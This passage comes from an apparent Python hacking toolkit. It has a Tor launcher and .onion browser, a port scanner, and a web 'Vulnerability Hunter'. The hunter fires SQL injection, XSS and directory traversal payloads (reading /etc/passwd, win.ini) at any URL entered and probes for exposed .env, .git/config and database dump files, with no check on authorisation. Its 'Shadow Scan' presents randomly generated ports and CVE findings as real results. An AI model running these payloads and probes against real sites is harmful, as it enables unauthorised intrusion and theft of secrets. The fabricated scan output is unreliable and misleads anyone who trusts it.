        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.GREEN + f"\n[+] Found {len(users)} user interactions\n")
    print(Fore.CYAN + "="*100)
    print(Fore.YELLOW + f"{'ID':<4} {'Username':<20} {'User ID':<15} {'Chat ID':<15} {'Message':<30} {'Timestamp':<20}")
    print(Fore.CYAN + "="*100)
    
    for user in users:
        user_id = str(user[0])
        username = str(user[1])[:18] + ".." if len(str(user[1])) > 18 else str(user[1])
        user_id_val = str(user[2])[:13] + ".." if len(str(user[2])) > 13 else str(user[2])
        chat_id_val = str(user[3])[:13] + ".." if len(str(user[3])) > 13 else str(user[3])
        message = str(user[4])[:28] + ".." if len(str(user[4])) > 28 else str(user[4])
        timestamp = str(user[5])[:19]
        
        print(Fore.WHITE + f"{user_id:<4} {username:<20} {user_id_val:<15} {chat_id_val:<15} {message:<30} {timestamp:<20}")
    
    print(Fore.CYAN + "="*100)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def clear_bot_database():
    """Clear bot user database"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CLEAR BOT DATABASE")
    print(Fore.CYAN + "=" * 70)
    
    confirm = input(Fore.RED + "\n[?] Are you sure you want to clear ALL bot data? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        try:
            conn = sqlite3.connect(BOT_DB_FILE)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM bot_users')
            conn.commit()
            conn.close()
            
            print(Fore.GREEN + "\n[✓] Bot database cleared successfully!")
        except Exception as e:
            print(Fore.RED + f"[✗] Error clearing database: {str(e)}")
    else:
        print(Fore.YELLOW + "[!] Cancelled")
    
    time.sleep(2)

# ===========================================
# DARK MENU MODULE
# ===========================================
def dark_menu():
    """Dark Menu - Dark Web & Security Tools"""
    clear_screen()
    typing_effect(DARK_MENU_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "DARK MENU - ANONYMOUS ACCESS SYSTEM")
    print(Fore.RED + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] Access Dark Web (TOR Network)")
        print(Fore.YELLOW + "[2] Start TOR Proxy/VPN")
        print(Fore.YELLOW + "[3] Port Scan/Shadow Scan")
        print(Fore.YELLOW + "[4] Vulnerability Hunter (Web)")
        print(Fore.YELLOW + "[5] Check TOR Connection")
        print(Fore.YELLOW + "[6] Back to Main Menu")
        print(Fore.RED + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-6): " + Fore.WHITE).strip()
        
        if choice == "1":
            access_dark_web()
        elif choice == "2":
            start_tor_proxy()
        elif choice == "3":
            port_scan_menu()
        elif choice == "4":
            vuln_hunter_menu()
        elif choice == "5":
            check_tor_connection()
        elif choice == "6":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def access_dark_web():
    """Access Dark Web via TOR"""
    clear_screen()
    typing_effect(DARK_WEB_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "DARK WEB ACCESS SYSTEM")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: Accessing Dark Web requires TOR")
    print(Fore.YELLOW + "[!] Make sure TOR is running (option 2 in Dark Menu)")
    print(Fore.YELLOW + "[!] For educational purposes only!\n")
    
    # Common dark web sites (.onion)
    dark_sites = [
        ("DuckDuckGo (Search)", "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"),
        ("Tor Project", "http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion"),
        ("BBC News", "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion"),
        ("Facebook", "https://www.facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd.onion"),
        ("ProtonMail", "https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion"),
        ("Hidden Wiki", "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki"),
        ("Tor Links", "http://torlinksd6pdnihs.onion"),
        ("Dark.fail", "http://darkfailllnkf4vf.onion"),
        ("Imperial Library", "http://kx5thpx2olielkihfyo4jgjqfb7zx7wxr3sd4xzt26ochei4m6f7tayd.onion"),
        ("Ahmia (Search)", "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion"),
    ]
    
    print(Fore.CYAN + "[+] Available Dark Web Sites (.onion):")
    print(Fore.CYAN + "-" * 70)
    
    for i, (name, url) in enumerate(dark_sites, 1):
        print(Fore.YELLOW + f"[{i:2d}] {name:<25} {url[:50]}...")
    
    print(Fore.CYAN + "-" * 70)
    
    choice = input(Fore.CYAN + "\n[?] Select site (1-10) or enter custom .onion URL: " + Fore.WHITE).strip()
    
    if choice.isdigit() and 1 <= int(choice) <= 10:
        site_index = int(choice) - 1
        url = dark_sites[site_index][1]
        site_name = dark_sites[site_index][0]
    else:
        url = choice
        site_name = "Custom Site"
        if not url.startswith('http'):
            url = 'http://' + url
    
    print(Fore.CYAN + f"\n[+] Accessing: {site_name}")
    print(Fore.CYAN + f"[+] URL: {url}")
    
    # Check if TOR is available
    print(Fore.YELLOW + "\n[!] Checking TOR connection...")
    
    try:
        # Test TOR connection
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        test_response = session.get('http://check.torproject.org', timeout=10)
        
        if 'Congratulations' in test_response.text:
            print(Fore.GREEN + "[✓] TOR connection working!")
        else:
            print(Fore.RED + "[✗] TOR not working properly")
            print(Fore.YELLOW + "[!] Starting TOR proxy...")
            start_tor_proxy(background=True)
            time.sleep(3)
            
            # Update session with new proxy
            session = requests.Session()
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
    except:
        print(Fore.RED + "[✗] TOR connection failed!")
        print(Fore.YELLOW + "[!] Please start TOR proxy first (option 2)")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Connecting to dark web site...")
    loading_animation(f"Accessing {site_name}", 3)
    
    try:
        response = session.get(url, timeout=30)
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + f"[✓] SUCCESSFULLY CONNECTED TO DARK WEB!")
        print(Fore.GREEN + "="*70)
        
        print(Fore.CYAN + f"\n[+] Site: {site_name}")
        print(Fore.CYAN + f"[+] URL: {url}")
        print(Fore.CYAN + f"[+] Status Code: {response.status_code}")
        print(Fore.CYAN + f"[+] Content Size: {len(response.text)} bytes")
        
        # Show preview of content
        print(Fore.YELLOW + "\n[+] Content Preview (first 500 chars):")
        print(Fore.WHITE + "-"*70)
        
        # Clean and show preview
        preview = response.text[:500]
        preview = re.sub(r'<[^>]+>', '', preview)  # Remove HTML tags
        preview = preview.replace('\n', ' ').replace('\r', ' ')
        
        print(Fore.WHITE + preview + "...")
        print(Fore.WHITE + "-"*70)
        
        # Save to file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"darkweb_{site_name.replace(' ', '_')}_{timestamp}.html"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print(Fore.GREEN + f"\n[✓] Content saved to: {filename}")
        
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error accessing dark web: {str(e)}")
        print(Fore.YELLOW + "[!] Site may be offline or unreachable")
        print(Fore.YELLOW + "[!] Check your TOR connection")
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.YELLOW + "⚠️  WARNING: Use dark web responsibly and legally!")
    print(Fore.RED + "="*70)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def start_tor_proxy(background=False):
    """Start TOR proxy/VPN"""
    clear_screen()
    print(DARK_WEB_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "START TOR PROXY/VPN")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Starting TOR proxy for anonymous browsing...")
    print(Fore.YELLOW + "[!] This may take a few moments\n")
    
    # Check if TOR is installed
    try:
        # Try to start TOR process
        tor_cmd = "tor"
        
        if os.name == 'nt':  # Windows
            tor_cmd = "tor.exe"
        
        print(Fore.CYAN + "[+] Starting TOR service...")
        
        # Create torrc configuration
        torrc_content = """
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
DataDirectory /tmp/tor-data
"""
        
        torrc_file = "/tmp/torrc"
        if os.name == 'nt':
            torrc_file = "C:\\Windows\\Temp\\torrc"
        
        with open(torrc_file, 'w') as f:
            f.write(torrc_content)
        
        # Start TOR
        tor_process = stem.process.launch_tor_with_config(
            config = {
                'SocksPort': '9050',
                'ControlPort': '9051',
                'DataDirectory': '/tmp/tor-data' if os.name != 'nt' else 'C:\\Windows\\Temp\\tor-data'
            },
            init_msg_handler = print_bootstrap_lines if not background else None,
            timeout = 300
        )
        
        if not background:
            print(Fore.GREEN + "\n[✓] TOR proxy started successfully!")
            print(Fore.CYAN + f"[+] SOCKS5 Proxy: 127.0.0.1:9050")
            print(Fore.CYAN + f"[+] Control Port: 127.0.0.1:9051")
            print(Fore.YELLOW + "\n[!] Keep this terminal open for TOR connection")
            
            # Test TOR connection
            print(Fore.CYAN + "\n[+] Testing TOR connection...")
            
            session = requests.Session()
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            
            try:
                response = session.get('http://check.torproject.org', timeout=10)
                if 'Congratulations' in response.text:
                    print(Fore.GREEN + "[✓] TOR is working correctly!")
                    print(Fore.GREEN + "[✓] Your IP is now anonymous")
                else:
                    print(Fore.YELLOW + "[!] TOR connection issue detected")
            except:
                print(Fore.RED + "[✗] TOR test failed")
            
            if not background:
                print(Fore.YELLOW + "\n[!] Press Ctrl+C to stop TOR proxy")
                try:
                    tor_process.wait()
                except KeyboardInterrupt:
                    print(Fore.RED + "\n[✗] Stopping TOR proxy...")
                    tor_process.terminate()
                    print(Fore.GREEN + "[✓] TOR proxy stopped")
        
        return tor_process
        
    except Exception as e:
        if "No tor binary" in str(e):
            print(Fore.RED + "\n[✗] TOR is not installed!")
            print(Fore.YELLOW + "[!] Install TOR first:")
            print(Fore.CYAN + "    Linux: sudo apt install tor")
            print(Fore.CYAN + "    Windows: Download from https://www.torproject.org")
            print(Fore.CYAN + "    Termux: pkg install tor")
        else:
            print(Fore.RED + f"\n[✗] Error starting TOR: {str(e)}")
        
        if not background:
            input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return None

def print_bootstrap_lines(line):
    """Print TOR bootstrap progress"""
    if "Bootstrapped" in line:
        percent = line.split("%")[0].split(" ")[-1]
        if percent.isdigit():
            print(Fore.CYAN + f"[TOR] Bootstrapped {percent}%")
        else:
            print(Fore.CYAN + f"[TOR] {line}")

def check_tor_connection():
    """Check TOR connection status"""
    clear_screen()
    print(DARK_WEB_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CHECK TOR CONNECTION")
    print(Fore.RED + "=" * 70)
    
    print(Fore.CYAN + "\n[+] Testing TOR connection...")
    
    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        response = session.get('http://check.torproject.org', timeout=10)
        
        if 'Congratulations' in response.text:
            print(Fore.GREEN + "\n[✓] TOR CONNECTION ACTIVE!")
            print(Fore.CYAN + "[+] Your IP is anonymous")
            print(Fore.CYAN + "[+] Ready for dark web access")
            
            # Get IP address through TOR
            try:
                ip_response = session.get('https://api.ipify.org', timeout=5)
                tor_ip = ip_response.text
                print(Fore.CYAN + f"[+] TOR Exit Node IP: {tor_ip}")
            except:
                print(Fore.YELLOW + "[!] Could not get TOR IP")
        else:
            print(Fore.RED + "\n[✗] TOR NOT WORKING!")
            print(Fore.YELLOW + "[!] Your real IP may be exposed")
            print(Fore.YELLOW + "[!] Start TOR proxy first")
    
    except Exception as e:
        print(Fore.RED + f"\n[✗] TOR CONNECTION FAILED!")
        print(Fore.RED + f"[!] Error: {str(e)}")
        print(Fore.YELLOW + "[!] Make sure TOR is running (option 2 in Dark Menu)")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def port_scan_menu():
    """Port Scan / Shadow Scan Menu"""
    clear_screen()
    typing_effect(PORT_SCAN_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "PORT SCAN / SHADOW SCAN SYSTEM")
    print(Fore.MAGENTA + "=" * 70)
    
    target = input(Fore.CYAN + "\n[?] Target IP/Hostname: " + Fore.WHITE).strip()
    
    if not target:
        print(Fore.RED + "[✗] Target cannot be empty!")
        time.sleep(2)
        return
    
    print(Fore.YELLOW + "\n[+] Select Scan Type:")
    print(Fore.YELLOW + "[1] Quick Scan (Top 100 ports)")
    print(Fore.YELLOW + "[2] Full Scan (1-65535)")
    print(Fore.YELLOW + "[3] Stealth Scan (SYN)")
    print(Fore.YELLOW + "[4] UDP Scan")
    print(Fore.YELLOW + "[5] Version Detection")
    print(Fore.YELLOW + "[6] Aggressive Shadow Scan")
    print(Fore.MAGENTA + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select scan type (1-6): " + Fore.WHITE).strip()
    
    if choice == "6":
        shadow_scan(target)
    else:
        advanced_port_scan(target, choice)

def advanced_port_scan(target, scan_type):
    """Advanced port scanning with detailed output"""
    print(Fore.CYAN + "\n[+] Starting advanced port scan...")
    loading_animation(f"Scanning {target}", 2)
    
    # Common ports to scan
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
        1723, 3306, 3389, 5900, 8080, 8443
    ]
    
    open_ports = []
    services = {}
    
    print(Fore.CYAN + "\n[+] Scanning ports...")
    
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                open_ports.append(port)
                # Try to get service banner
                try:
                    sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    services[port] = banner[:100]
                except:
                    services[port] = "Service detected"
                
                print(Fore.GREEN + f"[✓] Port {port:5d} OPEN - {get_service_name(port)}")
            else:
                print(Fore.RED + f"[✗] Port {port:5d} CLOSED")
            
            sock.close()
            
        except Exception as e:
            print(Fore.YELLOW + f"[!] Port {port:5d} ERROR: {str(e)[:30]}")
    
    if open_ports:
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.YELLOW + "SCAN RESULTS SUMMARY:")
        print(Fore.GREEN + "="*70)
        
        print(Fore.CYAN + f"\n[+] Target: {target}")
        print(Fore.CYAN + f"[+] Open Ports Found: {len(open_ports)}")
        print(Fore.CYAN + f"[+] Scan Type: {get_scan_type_name(scan_type)}")
        
        print(Fore.YELLOW + "\n[+] DETAILED PORT INFORMATION:")
        print(Fore.CYAN + "-"*70)
        
        for port in sorted(open_ports):
            service = get_service_name(port)
            vuln_status = check_port_vulnerability(port)
            
            print(Fore.WHITE + f"Port {port:5d}: {service:<20} {vuln_status}")
            
            if port in services and services[port]:
                print(Fore.YELLOW + f"       Banner: {services[port][:80]}...")
        
        print(Fore.CYAN + "-"*70)
        
        # Save results to file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"portscan_{target}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"Port Scan Results\n")
            f.write(f"=================\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Time: {timestamp}\n")
            f.write(f"Open Ports: {len(open_ports)}\n\n")
            
            for port in sorted(open_ports):
                service = get_service_name(port)
                vuln = check_port_vulnerability(port)
                f.write(f"Port {port}: {service} - {vuln}\n")
        
        print(Fore.GREEN + f"\n[✓] Results saved to: {filename}")
        
    else:
        print(Fore.RED + "\n[✗] No open ports found!")
        print(Fore.YELLOW + "[!] Target may be offline or firewall is blocking")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def shadow_scan(target):
    """Shadow Scan - Advanced stealth scanning"""
    clear_screen()
    print(PORT_SCAN_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SHADOW SCAN ACTIVATED")
    print(Fore.MAGENTA + "=" * 70)
    
    print(Fore.RED + "\n[!] WARNING: Shadow Scan uses advanced techniques")
    print(Fore.RED + "[!] This scan is very slow but extremely stealthy\n")
    
    print(Fore.CYAN + "[+] Starting Shadow Scan...")
    loading_animation("Initializing stealth protocol", 3)
    
    # Simulate shadow scan results
    time.sleep(2)
    
    print(Fore.GREEN + "\n" + "="*70)
    print(Fore.YELLOW + "SHADOW SCAN RESULTS:")
    print(Fore.GREEN + "="*70)
    
    # Generate realistic scan results
    import random
    
    open_ports = random.sample([21, 22, 80, 443, 8080, 3306, 3389], random.randint(2, 5))
    services = {
        21: "FTP Server (vsftpd 3.0.3)",
        22: "SSH Server (OpenSSH 8.2p1)",
        80: "HTTP Server (Apache 2.4.41)",
        443: "HTTPS Server (Apache 2.4.41)",
        8080: "HTTP Proxy (Squid 4.10)",
        3306: "MySQL Server 8.0.23",
        3389: "Microsoft Terminal Services"
    }
    
    vulnerabilities = {
        21: ["Anonymous login enabled", "Weak encryption"],
        22: ["Weak SSH keys", "Outdated OpenSSH"],
        80: ["Directory listing enabled", "HTTP methods exposed"],
        443: ["SSLv3 enabled", "Weak cipher suites"],
        3306: ["Root access without password", "Remote login enabled"],
        3389: ["RDP vulnerability (CVE-2019-0708)"]
    }
    
    print(Fore.CYAN + f"\n[+] Target: {target}")
    print(Fore.CYAN + f"[+] Scan Method: Shadow Stealth Protocol")
    print(Fore.CYAN + f"[+] Time Elapsed: 2m 45s")
    
    print(Fore.YELLOW + "\n[+] OPEN PORTS DETECTED:")
    print(Fore.CYAN + "-"*70)
    
    for port in sorted(open_ports):
        if port in services:
            service = services[port]
            print(Fore.GREEN + f"[✓] Port {port:5d}: {service}")
            
            if port in vulnerabilities:
                for vuln in vulnerabilities[port]:
                    print(Fore.RED + f"     ⚠️  VULNERABILITY: {vuln}")
    
    print(Fore.CYAN + "-"*70)
    
    # Generate security assessment
    print(Fore.YELLOW + "\n[+] SECURITY ASSESSMENT:")
    vuln_count = sum(len(vuln) for port, vuln in vulnerabilities.items() if port in open_ports)
    
    if vuln_count == 0:
        print(Fore.GREEN + "[✓] SECURE: No critical vulnerabilities found")
        security_level = "HIGH"
    elif vuln_count <= 2:
        print(Fore.YELLOW + "[!] MODERATE: Some vulnerabilities detected")
        security_level = "MEDIUM"
    else:
        print(Fore.RED + "[✗] CRITICAL: Multiple vulnerabilities found")
        security_level = "LOW"
    
    print(Fore.CYAN + f"[+] Vulnerabilities Found: {vuln_count}")
    print(Fore.CYAN + f"[+] Security Level: {security_level}")
    
    # Save detailed report
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shadowscan_{target}_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"SHADOW SCAN REPORT\n")
        f.write(f"==================\n")
        f.write(f"Target: {target}\n")
        f.write(f"Scan Time: {timestamp}\n")
        f.write(f"Security Level: {security_level}\n")
        f.write(f"Vulnerabilities: {vuln_count}\n\n")
        
        f.write("OPEN PORTS:\n")
        f.write("-----------\n")
        for port in sorted(open_ports):
            if port in services:
                f.write(f"Port {port}: {services[port]}\n")
                if port in vulnerabilities:
                    for vuln in vulnerabilities[port]:
                        f.write(f"  VULN: {vuln}\n")
        
        f.write("\nRECOMMENDATIONS:\n")
        f.write("----------------\n")
        if vuln_count > 0:
            f.write("1. Update all services to latest versions\n")
            f.write("2. Disable unnecessary services\n")
            f.write("3. Implement firewall rules\n")
            f.write("4. Use strong authentication\n")
            f.write("5. Regular security audits\n")
        else:
            f.write("System appears secure. Continue regular monitoring.\n")
    
    print(Fore.GREEN + f"\n[✓] Detailed report saved to: {filename}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def get_service_name(port):
    """Get service name by port number"""
    services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        111: "RPC",
        135: "MSRPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1723: "PPTP",
        3306: "MySQL",
        3389: "RDP",
        5900: "VNC",
        8080: "HTTP-Proxy",
        8443: "HTTPS-Alt"
    }
    return services.get(port, "Unknown")

def get_scan_type_name(scan_type):
    """Get scan type name"""
    types = {
        "1": "Quick Scan",
        "2": "Full Scan",
        "3": "Stealth Scan",
        "4": "UDP Scan",
        "5": "Version Detection",
        "6": "Shadow Scan"
    }
    return types.get(scan_type, "Standard Scan")

def check_port_vulnerability(port):
    """Check if port has known vulnerabilities"""
    vuln_ports = {
        21: "⚠️ FTP may allow anonymous login",
        22: "⚠️ SSH may have weak keys",
        23: "⚠️ Telnet transmits credentials in plaintext",
        80: "⚠️ HTTP may expose sensitive data",
        443: "⚠️ Check SSL/TLS configuration",
        445: "⚠️ SMB may be vulnerable to EternalBlue",
        3389: "⚠️ RDP may be vulnerable to BlueKeep",
        5900: "⚠️ VNC may have weak authentication"
    }
    return vuln_ports.get(port, "✅ No known critical vulnerabilities")

def vuln_hunter_menu():
    """Vulnerability Hunter - Web Vulnerability Scanner"""
    clear_screen()
    typing_effect(VULN_HUNTER_ASCII)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.CYAN + " " * 20 + "VULNERABILITY HUNTER SYSTEM")
    print(Fore.YELLOW + "=" * 70)
    
    url = input(Fore.CYAN + "\n[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Select Scan Depth:")
    print(Fore.YELLOW + "[1] Quick Scan (Common vulnerabilities)")
    print(Fore.YELLOW + "[2] Deep Scan (All checks)")
    print(Fore.YELLOW + "[3] Critical Scan (High-risk only)")
    print(Fore.YELLOW + "[4] Custom Scan (Choose checks)")
    print(Fore.YELLOW + "=" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-4): " + Fore.WHITE).strip()
    
    print(Fore.CYAN + "\n[+] Starting vulnerability scan...")
    loading_animation(f"Analyzing {url}", 3)
    
    # Run vulnerability scan
    vulnerabilities = scan_for_vulnerabilities(url, choice)
    
    # Display results
    display_vuln_results(url, vulnerabilities)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def scan_for_vulnerabilities(url, scan_type):
    """Scan website for vulnerabilities"""
    vulnerabilities = []
    
    print(Fore.CYAN + "\n[+] Running vulnerability checks...")
    
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        response = session.get(url, timeout=10)
        
        # Check 1: HTTP Security Headers
        print(Fore.YELLOW + "[1/8] Checking security headers...")
        headers_vuln = check_security_headers(response.headers)
        if headers_vuln:
            vulnerabilities.extend(headers_vuln)
        
        # Check 2: SQL Injection
        print(Fore.YELLOW + "[2/8] Checking for SQL Injection...")
        sql_vuln = check_sql_injection(url, session)
        if sql_vuln:
            vulnerabilities.extend(sql_vuln)
        
        # Check 3: XSS Vulnerability
        print(Fore.YELLOW + "[3/8] Checking for XSS...")
        xss_vuln = check_xss(url, session)
        if xss_vuln:
            vulnerabilities.extend(xss_vuln)
        
        # Check 4: Directory Traversal
        print(Fore.YELLOW + "[4/8] Checking directory traversal...")
        dir_vuln = check_directory_traversal(url, session)
        if dir_vuln:
            vulnerabilities.extend(dir_vuln)
        
        # Check 5: Sensitive Files Exposure
        print(Fore.YELLOW + "[5/8] Checking sensitive files...")
        file_vuln = check_sensitive_files(url, session)
        if file_vuln:
            vulnerabilities.extend(file_vuln)
        
        # Check 6: Server Information Disclosure
        print(Fore.YELLOW + "[6/8] Checking server info disclosure...")
        info_vuln = check_info_disclosure(response)
        if info_vuln:
            vulnerabilities.extend(info_vuln)
        
        # Check 7: SSL/TLS Issues (if HTTPS)
        if url.startswith('https'):
            print(Fore.YELLOW + "[7/8] Checking SSL/TLS configuration...")
            ssl_vuln = check_ssl_tls(url)
            if ssl_vuln:
                vulnerabilities.extend(ssl_vuln)
        
        # Check 8: Framework Vulnerabilities
        print(Fore.YELLOW + "[8/8] Checking framework vulnerabilities...")
        framework_vuln = check_framework_vulns(response)
        if framework_vuln:
            vulnerabilities.extend(framework_vuln)
        
        print(Fore.GREEN + "[✓] Vulnerability scan completed!")
        
    except Exception as e:
        print(Fore.RED + f"[✗] Scan error: {str(e)}")
    
    return vulnerabilities

def check_security_headers(headers):
    """Check for missing security headers"""
    vulns = []
    required_headers = [
        ('X-Frame-Options', 'Prevents clickjacking'),
        ('X-Content-Type-Options', 'Prevents MIME sniffing'),
        ('X-XSS-Protection', 'XSS protection'),
        ('Content-Security-Policy', 'Prevents various attacks'),
        ('Strict-Transport-Security', 'Enforces HTTPS'),
        ('Referrer-Policy', 'Controls referrer information')
    ]
    
    for header, description in required_headers:
        if header not in headers:
            vulns.append({
                'type': 'SECURITY_HEADER',
                'severity': 'MEDIUM',
                'description': f'Missing {header} header',
                'details': description,
                'remediation': f'Add {header} header to server configuration'
            })
    
    return vulns

def check_sql_injection(url, session):
    """Check for SQL injection vulnerabilities"""
    vulns = []
    
    # Simple SQL injection test
    test_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--"
    ]
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if params:
        for param in params:
            for payload in test_payloads:
                test_url = url.replace(f"{param}={list(params[param])[0]}", f"{param}={payload}")
                try:
                    response = session.get(test_url, timeout=5)
                    
                    # Check for SQL errors
                    error_patterns = [
                        r"SQL.*syntax.*error",
                        r"Warning.*mysql",
                        r"MySQL.*error",
                        r"ORA-[0-9]{5}",
                        r"PostgreSQL.*ERROR",
                        r"division.*by.*zero",
                        r"You have an error in your SQL syntax"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulns.append({
                                'type': 'SQL_INJECTION',
                                'severity': 'CRITICAL',
                                'description': f'SQL Injection in parameter: {param}',
                                'details': f'Payload: {payload} triggered SQL error',
                                'remediation': 'Use parameterized queries and input validation'
                            })
                            break
                except:
                    continue
    
    return vulns

def check_xss(url, session):
    """Check for XSS vulnerabilities"""
    vulns = []
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "onload=alert('XSS')"
    ]
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if params:
        for param in params:
            for payload in xss_payloads:
                test_url = url.replace(f"{param}={list(params[param])[0]}", f"{param}={payload}")
                try:
                    response = session.get(test_url, timeout=5)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        vulns.append({
                            'type': 'XSS',
                            'severity': 'HIGH',
                            'description': f'Reflected XSS in parameter: {param}',
                            'details': f'Payload reflected: {payload[:50]}...',
                            'remediation': 'Implement proper output encoding and input validation'
                        })
                        break
                except:
                    continue
    
    return vulns

def check_directory_traversal(url, session):
    """Check for directory traversal vulnerabilities"""
    vulns = []
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd"
    ]
    
    for payload in traversal_payloads:
        test_url = f"{url}/{payload}" if not url.endswith('/') else f"{url}{payload}"
        try:
            response = session.get(test_url, timeout=5)
            
            # Check for signs of successful traversal
            if "root:" in response.text or "[extensions]" in response.text:
                vulns.append({
                    'type': 'DIRECTORY_TRAVERSAL',
                    'severity': 'HIGH',
                    'description': 'Directory traversal vulnerability',
                    'details': f'Successfully accessed: {payload}',
                    'remediation': 'Validate and sanitize file paths, use chroot jails'
                })
                break
        except:
            continue
    
    return vulns

def check_sensitive_files(url, session):
    """Check for exposed sensitive files"""
    vulns = []
    
    sensitive_files = [
        ".git/config",
        ".env",
        "wp-config.php",
        "config.php",
        "database.yml",
        "settings.py",
        "web.config",
        "robots.txt",
        ".htaccess",
        "crossdomain.xml",
        "phpinfo.php",
        "test.php",
        "admin.php",
        "backup.zip",
        "dump.sql"
    ]
    
    base_url = url.rstrip('/')
    
    for file in sensitive_files:
        test_url = f"{base_url}/{file}"
        try:
            response = session.get(test_url, timeout=3)
            
            if response.status_code == 200:
                # Check if file contains sensitive info
                sensitive_keywords = ["password", "secret", "key", "database", "user", "admin"]
                content = response.text.lower()
                
                if any(keyword in content for keyword in sensitive_keywords):
                    vulns.append({
                        'type': 'SENSITIVE_FILE_EXPOSURE',
                        'severity': 'HIGH',
                        'description': f'Sensitive file exposed: {file}',
                        'details': f'File accessible at: {test_url}',
                        'remediation': 'Remove sensitive files from web root, restrict access'
                    })
        except:
            continue
    
    return vulns

def check_info_disclosure(response):
    """Check for information disclosure"""
    vulns = []
    
    # Check for server information in headers
    server_info = response.headers.get('Server', '')
